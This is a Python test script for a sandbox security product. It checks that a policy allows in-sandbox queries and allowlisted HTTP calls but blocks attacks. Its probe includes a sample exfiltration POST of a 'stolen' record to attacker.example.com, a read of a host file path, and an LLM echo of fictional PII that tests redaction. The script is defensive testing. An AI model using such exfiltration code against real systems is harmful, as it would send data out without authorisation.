"""Targeted proof that declaw neutralizes federated-analytics attack paths.

In ONE sandbox with `wisdomai_analytics_policy()`:

  1. Warehouse-style read (simulated in-sandbox DuckDB-ish query) succeeds
  2. SaaS-style GET to httpbin returns 200
  3. Exfil to `attacker.example.com` is blocked by the allowlist
  4. Host filesystem read (/Users/...) fails with FileNotFoundError
  5. LLM call with PII in prompt returns redaction tokens to the agent
"""
from __future__ import annotations

import os
import sys
import textwrap

from declaw import (ALL_TRAFFIC, AuditConfig, NetworkPolicy, PIIConfig,
                     Sandbox, SecurityPolicy)

GREEN = "\033[32m"; RED = "\033[31m"; END = "\033[0m"
passes = 0; fails = 0
def ok(m):
    global passes; passes += 1; print(f"  {GREEN}PASS{END} {m}")
def bad(m):
    global fails; fails += 1; print(f"  {RED}FAIL{END} {m}")


PROBE = textwrap.dedent("""
    import json, ssl, os, urllib.request
    ctx = ssl._create_unverified_context()
    out = {}

    # 1. Warehouse-style query — in-VM stdlib only, no network needed
    rows = [{'clinic':'north','rate':0.25},{'clinic':'south','rate':0.08}]
    worst = max(rows, key=lambda r: r['rate'])
    out['warehouse'] = {'worst_clinic': worst['clinic'], 'worst_rate': worst['rate']}

    # 2. SaaS-style GET (httpbin stand-in)
    try:
        with urllib.request.urlopen('https://httpbin.org/status/200', timeout=10, context=ctx) as r:
            out['saas'] = {'status': r.status}
    except Exception as e:
        out['saas'] = {'error': f'{type(e).__name__}'}

    # 3. Exfil to unlisted host — expect BLOCKED
    try:
        body = json.dumps({'stolen':'record'}).encode()
        req = urllib.request.Request('https://attacker.example.com/exfil', data=body,
                                     headers={'Content-Type':'application/json'})
        urllib.request.urlopen(req, timeout=8, context=ctx).read()
        out['exfil'] = 'REACHED'
    except Exception as e:
        out['exfil'] = f'BLOCKED: {type(e).__name__}'

    # 4. Host-FS read — expect FileNotFoundError
    try:
        with open('/Users/shivanshanand/Documents/workflows/data-intelligence-workflows/README.md') as f:
            out['host_fs'] = f'READ {len(f.read())} bytes'
    except Exception as e:
        out['host_fs'] = f'BLOCKED: {type(e).__name__}'

    # 5. LLM echo with PII — expect tokens
    try:
        from openai import OpenAI
        PII = 'Account owner Alice Example, email alice@corp.io, SSN 111-22-3333.'
        r = OpenAI().chat.completions.create(
            model='gpt-4.1',
            messages=[{'role':'user','content':
                f'Echo bot. Repeat verbatim between markers. <<<{PII}>>>'}],
            max_completion_tokens=150,
        )
        out['llm_echo'] = r.choices[0].message.content
    except Exception as e:
        out['llm_echo'] = f'ERROR: {type(e).__name__}'

    with open('/tmp/out.json','w') as f: json.dump(out, f)
""")


def main() -> None:
    if not os.getenv("DECLAW_API_KEY"):
        print("DECLAW_API_KEY required"); sys.exit(1)
    if not os.getenv("OPENAI_API_KEY"):
        print("OPENAI_API_KEY required"); sys.exit(1)

    allow = ["api.openai.com", "httpbin.org", "*.httpbin.org"]
    pol = SecurityPolicy(
        pii=PIIConfig(enabled=True,
                      types=["ssn", "email", "phone", "person_name", "address"],
                      action="redact", rehydrate_response=False),
        network=NetworkPolicy(allow_out=allow, deny_out=[ALL_TRAFFIC]),
        audit=AuditConfig(enabled=True),
    )
    sbx = Sandbox.create(template="ai-agent", timeout=240, security=pol,
                         envs={"OPENAI_API_KEY": os.environ["OPENAI_API_KEY"]})
    print(f"sandbox: {sbx.sandbox_id}  allow_out={allow}")
    try:
        sbx.files.write("/tmp/in.json", "{}")
        sbx.files.write("/tmp/probe.py", PROBE)
        r = sbx.commands.run("python3 /tmp/probe.py", timeout=150)
        if r.exit_code != 0:
            print("probe failed:", r.stderr[:800]); sys.exit(1)
        import json as _j
        out = _j.loads(sbx.files.read("/tmp/out.json"))
        print("\n=== Results ==="); print(_j.dumps(out, indent=2))

        (ok if out.get("warehouse", {}).get("worst_clinic") == "north" else bad)(
            "Warehouse query returned expected row"
        )
        (ok if out.get("saas", {}).get("status") == 200 else bad)(
            f"SaaS GET reached (status={out.get('saas')})"
        )
        (ok if str(out.get("exfil", "")).startswith("BLOCKED") else bad)(
            f"attacker.example.com blocked: {out.get('exfil')!r}"
        )
        (ok if str(out.get("host_fs", "")).startswith("BLOCKED") else bad)(
            f"Host FS read blocked: {out.get('host_fs')!r}"
        )
        echo = out.get("llm_echo", "")
        leaked = ("alice@corp.io" in echo) or ("111-22-3333" in echo) or ("Alice Example" in echo)
        (bad if leaked else ok)("LLM echo did NOT contain raw PII")

        print(f"\n{GREEN}{passes} pass{END}   {RED}{fails} fail{END}")
        sys.exit(0 if fails == 0 else 1)
    finally:
        sbx.kill()


if __name__ == "__main__":
    main()
